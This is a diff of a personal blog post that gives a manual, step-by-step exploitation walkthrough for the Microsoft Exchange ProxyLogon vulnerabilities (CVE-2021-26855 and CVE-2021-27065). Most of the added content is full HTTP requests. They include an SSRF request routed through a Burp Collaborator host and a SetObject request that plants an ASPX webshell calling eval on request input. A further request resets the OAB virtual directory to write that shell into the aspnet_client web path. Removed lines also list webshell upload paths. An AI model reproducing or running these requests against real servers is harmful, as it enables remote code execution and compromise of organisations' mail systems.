@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ProxyLogon Utilization method, Yangsir">
+    <meta name="keywords" content="ProxyLogon Utilization method (Manual use), Yangsir">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>ProxyLogon Utilization method | Yangsir</title>
+    <title>ProxyLogon Utilization method (Manual use) | Yangsir</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/image-20210726161008442.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.44.18.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ProxyLogon Utilization method</h1>
+                    <h1 class="description center-align post-title">ProxyLogon Utilization method (Manual use)</h1>
                 </div>
             </div>
         </div>
@@ -469,28 +469,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2021-07-26
+                    2021-07-27
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2021-07-26
+                    2021-07-27
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    622
+                    1.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    3 Min
+                    7 Min
                 </div>
                 
 
@@ -513,67 +513,137 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">The way of exploiting loopholes has come out long ago, mainly because there are more pits in the process of using one time, and the final failure, just have time to do things over and over again, and repeat learning here
+                <h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">Having written a previous article on successful exploits, in order to figure out what was wrong with the locally built environment that didn&#39;t work, let&#39;s dive into the relevant data packages and principles again
 
-In the process, FQDN and OABID are the main pits encountered by the younger brother. If the older brothers have better articles, they can push the younger brother to read<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+Note: There are some problems with the online exp, and the script needs to be modified twice to ensure the success of using it. For example, the following script output is displayed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">Vulnerability Description:
-Exchange Server is an E-mail service component of Microsoft. It is a messaging and collaboration system. On March 3, 2021, Microsoft officially released a Security update for Microsoft Exchange, which disclosed several high-risk and critical vulnerabilities, including: In CVE-2021-26855 Exchange SSRF vulnerability, an attacker can directly construct malicious requests, initiate arbitrary HTTP requests as an Exchange server, scan the Intranet, and obtain Exchange user information. The vulnerability exploits no identity authentication
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.43.42.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.44.03.png"></p>
+<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">It is known that the project mainly uses two vulnerabilities to obtain permissions, one SSRF and one file write
 
-Affected version:
-Microsoft Exchange 2013
-Microsoft Exchange 2016
-Microsoft Exchange 2019
-Microsoft Exchange 2010<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+Cve-2021-26855 SSRF, the problem occurs when the client request is proxied to the server, the vulnerability can obtain the user&#39;s SID, the most important step in the non-interactive attack chain
 
-<h2 id="Local-environment"><a href="#Local-environment" class="headerlink" title="Local environment"></a>Local environment</h2><pre class="line-numbers language-none"><code class="language-none">Note that there are still some problems with the built environment. After the current test, only the SSRF succeeds, and the subsequent getshell environment needs to be changed
+Cve-2021-27065 File writing, Although the content to be written cannot be completely controlled, the file name and path can be set arbitrarily. When.aspx is written to a file, a Trojan horse can be inserted into the file to achieve remote control
 
-I don&#39;t know if there is no getshell because of my brother&#39;s operation problem. If my brother can succeed, please tell my brother
+The process is as follows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-I am using server2016+exchange2016，the following<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.44.11.png"></p>
+<h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="CVE-2021–26855-SSRF"><a href="#CVE-2021–26855-SSRF" class="headerlink" title="CVE-2021–26855-SSRF"></a>CVE-2021–26855-SSRF</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET /owa/auth/yyyyyy.js HTTP/1.1
+Host: mail.yangsir.git
+User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> WOW64<span class="token punctuation">;</span> rv:47.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>
+Accept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,en-US<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.5</span>,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.3</span>
+Accept-Encoding: gzip, deflate
+DNT: <span class="token number">1</span>
+Referer: https://mail.yangsir.git/owa/auth/logon.aspx?url<span class="token operator">=</span>https%3a%2f%2fmail.yangsir.git%2fecp%2f%3fexsvurl%3d1%26p%3dVirtualDirectories<span class="token operator">&amp;</span><span class="token assign-left variable">reason</span><span class="token operator">=</span><span class="token number">0</span>
+Cookie: X-AnonResource<span class="token operator">=</span>true<span class="token punctuation">;</span> X-AnonResource-Backend<span class="token operator">=</span>lg5vmst556l4ut5hg01cdlo6txzqnf.burpcollaborator.net/ecp/default.flt?~3
+X-Forwarded-For: <span class="token number">8.8</span>.8.8
+Connection: close
+Cache-Control: max-age<span class="token operator">=</span><span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/image-20210726161008442.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">New machine installation ex16 will report error, as follows, search the relevant dependence on self-installation, basic are very simple, also do not have to search what, what is missing under what<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.44.18.png"></p>
+<h3 id="CVE-2021-27065-File-writing"><a href="#CVE-2021-27065-File-writing" class="headerlink" title="CVE-2021-27065-File writing"></a>CVE-2021-27065-File writing</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">The OAB external URL writes Trojan content
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/image-20210726161114892.png"></p>
-<h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h3><pre class="line-numbers language-none"><code class="language-none">The URL that tests can use:
-&#x2F;owa&#x2F;auth&#x2F;qqqqq.js
-&#x2F;owa&#x2F;auth&#x2F;Current&#x2F;1.js
-&#x2F;owa&#x2F;auth&#x2F;Current&#x2F;themes&#x2F;resources&#x2F;logon.css
-&#x2F;owa&#x2F;auth&#x2F;Current&#x2F;themes&#x2F;resources&#x2F;.....
+POST /ecp/DDI/DDIService.svc/SetObject?ActivityCorrelationID<span class="token operator">=</span>e9cf840e-e595-facd-3710-afbe2aad22a8<span class="token operator">&amp;</span><span class="token assign-left variable">schema</span><span class="token operator">=</span>OABVirtualDirectory<span class="token operator">&amp;</span><span class="token assign-left variable">msExchEcpCanary</span><span class="token operator">=</span>54aREH4XW064p9E_YOEzj0AzPh6oUNkIW6PI1a8ziUpOwNZMxxxhaQeRm8wzpYDo18aE9sIw1FY. HTTP/1.1
+Host: mail.yangsir.git
+User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> WOW64<span class="token punctuation">;</span> rv:47.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>
+Accept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,en-US<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.5</span>,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.3</span>
+Accept-Encoding: gzip, deflate
+DNT: <span class="token number">1</span>
+X-Requested-With: XMLHttpRequest
+Content-Type: application/json<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>utf-8
+Referer: https://mail.yangsir.git/ecp/VDirMgmt/EditOABVDir.aspx?pwmcid<span class="token operator">=</span><span class="token number">5</span><span class="token operator">&amp;</span><span class="token assign-left variable">ReturnObjectType</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">id</span><span class="token operator">=</span>cde9e494-1dc4-4d03-898c-d00b04b9456f
+Content-Length: <span class="token number">387</span>
+Cookie: X-BackEndCookie<span class="token operator">=</span>S-1-5-21-2921479619-1120952621-1804897559-500<span class="token operator">=</span>u56Lnp2ejJqBncfHnMjPzMvSysnOztLLmZyc0sfGzJzSys/PmcjMmsuezczJgYHNz83O0s/H0s3Jq8/NxcvMxc7N<span class="token punctuation">;</span> <span class="token assign-left variable">msExchEcpCanary</span><span class="token operator">=</span>54aREH4XW064p9E_YOEzj0AzPh6oUNkIW6PI1a8ziUpOwNZMxxxhaQeRm8wzpYDo18aE9sIw1FY.<span class="token punctuation">;</span> <span class="token assign-left variable">PrivateComputer</span><span class="token operator">=</span>true<span class="token punctuation">;</span> <span class="token assign-left variable">ClientId</span><span class="token operator">=</span>9C5BDFDA35A147F39F0E2590680F6ABC<span class="token punctuation">;</span> X-OWA-JS-PSD<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token assign-left variable">PBack</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> ASP.NET_SessionId<span class="token operator">=</span>a69af73f-e5f2-4f51-9ad9-d978a9bbce96<span class="token punctuation">;</span> <span class="token assign-left variable">TimeOffset</span><span class="token operator">=</span>-480<span class="token punctuation">;</span> <span class="token assign-left variable">Eac_CmdletLogging</span><span class="token operator">=</span>false<span class="token punctuation">;</span> <span class="token assign-left variable">SrvTrialChecked</span><span class="token operator">=</span>true<span class="token punctuation">;</span> <span class="token assign-left variable">cadata</span><span class="token operator">=</span>06NwEfbphfaRV9ssqyInQlgydWqNPlQtZO3YxBSMwrRa+RalySU/CPAxhy/jqUEy8lAUDRG7wPwtheb4uiGnyiUjR15JHgzKgySIlRG9Azs<span class="token operator">=</span><span class="token punctuation">;</span> <span class="token assign-left variable">cadataTTL</span><span class="token operator">=</span>S4vlaLBame2nk4A/ae0yOg<span class="token operator">==</span><span class="token punctuation">;</span> <span class="token assign-left variable">cadataKey</span><span class="token operator">=</span>Debg0f+yPp6Dg8iiPU42hQ0EpTFD5Yrxj0aWXxSXl/Ta+eoraf3tAPoS7k6BPoQfjVSysCx2EcoYrShKfCT7bKAcpk1S4Kpj9U3NJgIazLSlnC/LHXmUpj02eNmqzUWoosJ90OVm6JqCrPSUkncZBJTBF7BSd7GuerZdW9/2PEPmUnkPOBGkAaGL6mR/QEL4mndw+koqTI0mkXixv/jrjJZomTOupgVS1sOiTkx1N8H19lhzcHHoNfvL+jFFP7ZMpCLkp0hKJUr++MBxNzu/zVieqggH2E5ZOpgEOB1w28uMFrMcTL9GCkOZU06i1jnHnqjgOZTDxwl//18LkjbE5w<span class="token operator">==</span><span class="token punctuation">;</span> <span class="token assign-left variable">cadataIV</span><span class="token operator">=</span>YCiLoW2R3fbX772qkkS+el/FDthDT6A9NOa7N9mChdEtY7U3qSxmkCDcO6GmUk8f6+O8UD3v3xVpFHOtsAR601tzFTGE9kZ399Mpnmf8atZYOLoehVJe8iD7b1NXu0MmQuZTpPNb84dn9lZZOqToffR8XDW2SEvBd7zk42CqoMwpcGUprhXDPdvXql6+tKZXviIuHd/uD8XW9N+KUFwvt2S3oI0sLU6aaKJQyiBOe52v3avwDOVQDR9vQmWdCnk+Z1wU+j7Cy/hsJ2edpWBI/2cwIQJSKhY3Q9YB0Y25/UWv2WaiCP3up90wE/ntrotTKwSiIxD9HsFSMcYsHy5rNg<span class="token operator">==</span><span class="token punctuation">;</span> <span class="token assign-left variable">cadataSig</span><span class="token operator">=</span>FmESD5gnVClB7HLgE81gQgjsXXQE6T3sg/aQ4K1gx199E16V5Owoqt2GZ26aikBGOUMUgyGy+MTrVrNWoTT6yh4G7Ax/RjahIXFZ8CBg+Ys7QZXP/zoCeR2jRQBGhNb/snHpPBb609i6Xabxsz2zf8ZIk5Z4Pq29oKBBSpQF5v8rE9Qy/9qkxwsejDh4i7+dl+gnXUXd5k51cIzZO7VfL+etT76/v6d3v1SabnY5gstaIn0kCsfAtyqQA7px3hm7i4puPa50ovFebpkkPcSfvErKlB+H4SLkJzBAJbBZaWgh2lC4sZpFeSG/MOfSLYuCE5Ccev70mK+VKeCFaM+2bQ<span class="token operator">==</span>
+X-Forwarded-For: <span class="token number">8.8</span>.8.8
+Connection: close
 
-set cookie：X -AnonResource&#x3D;true; X-AnonResource-Backend&#x3D;XXXXXX&#x2F;ecp&#x2F;default.flt?~3; X-BEResource&#x3D;localhost&#x2F;owa&#x2F;auth&#x2F;logon.aspx?~3;
+<span class="token punctuation">&#123;</span><span class="token string">"identity"</span>:<span class="token punctuation">&#123;</span><span class="token string">"__type"</span><span class="token builtin class-name">:</span><span class="token string">"Identity:ECP"</span>,<span class="token string">"DisplayName"</span><span class="token builtin class-name">:</span><span class="token string">"OAB (Default Web Site)"</span>,<span class="token string">"RawIdentity"</span><span class="token builtin class-name">:</span><span class="token string">"cde9e494-1dc4-4d03-898c-d00b04b9456f"</span><span class="token punctuation">&#125;</span>,<span class="token string">"properties"</span>:<span class="token punctuation">&#123;</span><span class="token string">"Parameters"</span>:<span class="token punctuation">&#123;</span><span class="token string">"__type"</span><span class="token builtin class-name">:</span><span class="token string">"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel"</span>,<span class="token string">"ExternalUrl"</span><span class="token builtin class-name">:</span><span class="token string">"http://mytest/&lt;script language=<span class="token entity" title="\&quot;">\"</span>JScript<span class="token entity" title="\&quot;">\"</span> runat=<span class="token entity" title="\&quot;">\"</span>server<span class="token entity" title="\&quot;">\"</span>> function Page_Load()&#123;/**/eval(Request[<span class="token entity" title="\&quot;">\"</span>code<span class="token entity" title="\&quot;">\"</span>],<span class="token entity" title="\&quot;">\"</span>unsafe<span class="token entity" title="\&quot;">\"</span>);&#125;&lt;/script>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-You can use hackbar like this:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.44.24.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">Mainly focus on ActivityCorrelationID, msExchEcpCanary, the latter use is very important<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/iShot2021-07-2618.19.39.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">DNS The following command output is displayed<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.44.32.png"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rest virtual <span class="token function">dir</span>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/iShot2021-07-2618.20.00.png"></p>
-<h3 id="Mail-the-enumeration"><a href="#Mail-the-enumeration" class="headerlink" title="Mail the enumeration"></a>Mail the enumeration</h3><pre class="line-numbers language-none"><code class="language-none">You can use this:
-https:&#x2F;&#x2F;github.com&#x2F;charlottelatest&#x2F;CVE-2021-26855<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+POST /ecp/DDI/DDIService.svc/SetObject?ActivityCorrelationID<span class="token operator">=</span>06bd9c20-bcbb-e3bb-9501-9b4acca3cf39<span class="token operator">&amp;</span><span class="token assign-left variable">schema</span><span class="token operator">=</span>ResetOABVirtualDirectory<span class="token operator">&amp;</span><span class="token assign-left variable">msExchEcpCanary</span><span class="token operator">=</span>54aREH4XW064p9E_YOEzj0AzPh6oUNkIW6PI1a8ziUpOwNZMxxxhaQeRm8wzpYDo18aE9sIw1FY. HTTP/1.1
+Host: mail.yangsir.git
+User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> WOW64<span class="token punctuation">;</span> rv:47.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>
+Accept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,en-US<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.5</span>,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.3</span>
+Accept-Encoding: gzip, deflate
+DNT: <span class="token number">1</span>
+X-Requested-With: XMLHttpRequest
+Content-Type: application/json<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>utf-8
+Referer: https://mail.yangsir.git/ecp/VDirMgmt/ResetVirtualDirectory.aspx?pwmcid<span class="token operator">=</span><span class="token number">8</span><span class="token operator">&amp;</span><span class="token assign-left variable">ReturnObjectType</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">id</span><span class="token operator">=</span>cde9e494-1dc4-4d03-898c-d00b04b9456f<span class="token operator">&amp;</span><span class="token assign-left variable">schema</span><span class="token operator">=</span>ResetOABVirtualDirectory
+Content-Length: <span class="token number">321</span>
+Cookie: X-BackEndCookie<span class="token operator">=</span>S-1-5-21-2921479619-1120952621-1804897559-500<span class="token operator">=</span>u56Lnp2ejJqBncfHnMjPzMvSysnOztLLmZyc0sfGzJzSys/PmcjMmsuezczJgYHNz83O0s/H0s3Jq8/NxcvIxczL<span class="token punctuation">;</span> <span class="token assign-left variable">msExchEcpCanary</span><span class="token operator">=</span>54aREH4XW064p9E_YOEzj0AzPh6oUNkIW6PI1a8ziUpOwNZMxxxhaQeRm8wzpYDo18aE9sIw1FY.<span class="token punctuation">;</span> <span class="token assign-left variable">PrivateComputer</span><span class="token operator">=</span>true<span class="token punctuation">;</span> <span class="token assign-left variable">ClientId</span><span class="token operator">=</span>9C5BDFDA35A147F39F0E2590680F6ABC<span class="token punctuation">;</span> X-OWA-JS-PSD<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token assign-left variable">PBack</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> ASP.NET_SessionId<span class="token operator">=</span>a69af73f-e5f2-4f51-9ad9-d978a9bbce96<span class="token punctuation">;</span> <span class="token assign-left variable">TimeOffset</span><span class="token operator">=</span>-480<span class="token punctuation">;</span> <span class="token assign-left variable">Eac_CmdletLogging</span><span class="token operator">=</span>false<span class="token punctuation">;</span> <span class="token assign-left variable">SrvTrialChecked</span><span class="token operator">=</span>true<span class="token punctuation">;</span> <span class="token assign-left variable">cadata</span><span class="token operator">=</span>06NwEfbphfaRV9ssqyInQlgydWqNPlQtZO3YxBSMwrRa+RalySU/CPAxhy/jqUEy8lAUDRG7wPwtheb4uiGnyiUjR15JHgzKgySIlRG9Azs<span class="token operator">=</span><span class="token punctuation">;</span> <span class="token assign-left variable">cadataTTL</span><span class="token operator">=</span>S4vlaLBame2nk4A/ae0yOg<span class="token operator">==</span><span class="token punctuation">;</span> <span class="token assign-left variable">cadataKey</span><span class="token operator">=</span>Debg0f+yPp6Dg8iiPU42hQ0EpTFD5Yrxj0aWXxSXl/Ta+eoraf3tAPoS7k6BPoQfjVSysCx2EcoYrShKfCT7bKAcpk1S4Kpj9U3NJgIazLSlnC/LHXmUpj02eNmqzUWoosJ90OVm6JqCrPSUkncZBJTBF7BSd7GuerZdW9/2PEPmUnkPOBGkAaGL6mR/QEL4mndw+koqTI0mkXixv/jrjJZomTOupgVS1sOiTkx1N8H19lhzcHHoNfvL+jFFP7ZMpCLkp0hKJUr++MBxNzu/zVieqggH2E5ZOpgEOB1w28uMFrMcTL9GCkOZU06i1jnHnqjgOZTDxwl//18LkjbE5w<span class="token operator">==</span><span class="token punctuation">;</span> <span class="token assign-left variable">cadataIV</span><span class="token operator">=</span>YCiLoW2R3fbX772qkkS+el/FDthDT6A9NOa7N9mChdEtY7U3qSxmkCDcO6GmUk8f6+O8UD3v3xVpFHOtsAR601tzFTGE9kZ399Mpnmf8atZYOLoehVJe8iD7b1NXu0MmQuZTpPNb84dn9lZZOqToffR8XDW2SEvBd7zk42CqoMwpcGUprhXDPdvXql6+tKZXviIuHd/uD8XW9N+KUFwvt2S3oI0sLU6aaKJQyiBOe52v3avwDOVQDR9vQmWdCnk+Z1wU+j7Cy/hsJ2edpWBI/2cwIQJSKhY3Q9YB0Y25/UWv2WaiCP3up90wE/ntrotTKwSiIxD9HsFSMcYsHy5rNg<span class="token operator">==</span><span class="token punctuation">;</span> <span class="token assign-left variable">cadataSig</span><span class="token operator">=</span>FmESD5gnVClB7HLgE81gQgjsXXQE6T3sg/aQ4K1gx199E16V5Owoqt2GZ26aikBGOUMUgyGy+MTrVrNWoTT6yh4G7Ax/RjahIXFZ8CBg+Ys7QZXP/zoCeR2jRQBGhNb/snHpPBb609i6Xabxsz2zf8ZIk5Z4Pq29oKBBSpQF5v8rE9Qy/9qkxwsejDh4i7+dl+gnXUXd5k51cIzZO7VfL+etT76/v6d3v1SabnY5gstaIn0kCsfAtyqQA7px3hm7i4puPa50ovFebpkkPcSfvErKlB+H4SLkJzBAJbBZaWgh2lC4sZpFeSG/MOfSLYuCE5Ccev70mK+VKeCFaM+2bQ<span class="token operator">==</span>
+X-Forwarded-For: <span class="token number">8.8</span>.8.8
+Connection: close
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/iShot2021-07-2618.26.12.png"></p>
-<h3 id="Getshell（Many-of-the-public-scripts-have-problems-and-the-successful-one-is-recommended-here）"><a href="#Getshell（Many-of-the-public-scripts-have-problems-and-the-successful-one-is-recommended-here）" class="headerlink" title="Getshell（Many of the public scripts have problems, and the successful one is recommended here）"></a>Getshell（Many of the public scripts have problems, and the successful one is recommended here）</h3><pre class="line-numbers language-none"><code class="language-none">After many tests, it is found that sometimes the target can not be exploited successfully despite the existence of loopholes!!
+<span class="token punctuation">&#123;</span><span class="token string">"identity"</span>:<span class="token punctuation">&#123;</span><span class="token string">"__type"</span><span class="token builtin class-name">:</span><span class="token string">"Identity:ECP"</span>,<span class="token string">"DisplayName"</span><span class="token builtin class-name">:</span><span class="token string">"OAB (Default Web Site)"</span>,<span class="token string">"RawIdentity"</span><span class="token builtin class-name">:</span><span class="token string">"cde9e494-1dc4-4d03-898c-d00b04b9456f"</span><span class="token punctuation">&#125;</span>,<span class="token string">"properties"</span>:<span class="token punctuation">&#123;</span><span class="token string">"Parameters"</span>:<span class="token punctuation">&#123;</span><span class="token string">"__type"</span><span class="token builtin class-name">:</span><span class="token string">"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel"</span>,<span class="token string">"FilePathName"</span><span class="token builtin class-name">:</span><span class="token string">"<span class="token entity" title="\\">\\</span><span class="token entity" title="\\">\\</span>127.0.0.1<span class="token entity" title="\\">\\</span>c$<span class="token entity" title="\\">\\</span>inetpub<span class="token entity" title="\\">\\</span>wwwroot<span class="token entity" title="\\">\\</span>aspnet_client<span class="token entity" title="\\">\\</span>yangsir.aspx"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-In addition, the local 2016 environment is still unable to getshell!!
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.44.55.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">confirm you are success<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-The OABID needs to be modified<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.45.02.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">So far, high permission is required. To obtain the high permission email account, the SSRF obtains the information to perform file writing<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/iShot2021-07-2618.26.40.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">Visit WebShell below<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="Manual-use-according-to-exp"><a href="#Manual-use-according-to-exp" class="headerlink" title="Manual use according to exp"></a>Manual use according to exp</h2><h3 id="Get-fqdn"><a href="#Get-fqdn" class="headerlink" title="Get fqdn"></a>Get fqdn</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.45.10.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">The FQDN: YANGDC; you can be obtained from the return header x-feserver<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/iShot2021-07-2618.21.17.png"></p>
-<h4 id="Regular-Webshell-upload-path-easy-to-turn-over-directory"><a href="#Regular-Webshell-upload-path-easy-to-turn-over-directory" class="headerlink" title="Regular Webshell upload path (easy to turn over directory)"></a>Regular Webshell upload path (easy to turn over directory)</h4><pre class="line-numbers language-none"><code class="language-none">\inetpub\wwwroot\aspnet_client\ (any .aspx file under this folder or sub folders)
-\&lt;exchange install path&gt;\FrontEnd\HttpProxy\ecp\auth\ (any file besides TimeoutLogoff.aspx)
-\&lt;exchange install path&gt;\FrontEnd\HttpProxy\owa\auth\ (any file or modified file that is not part of a standard install)
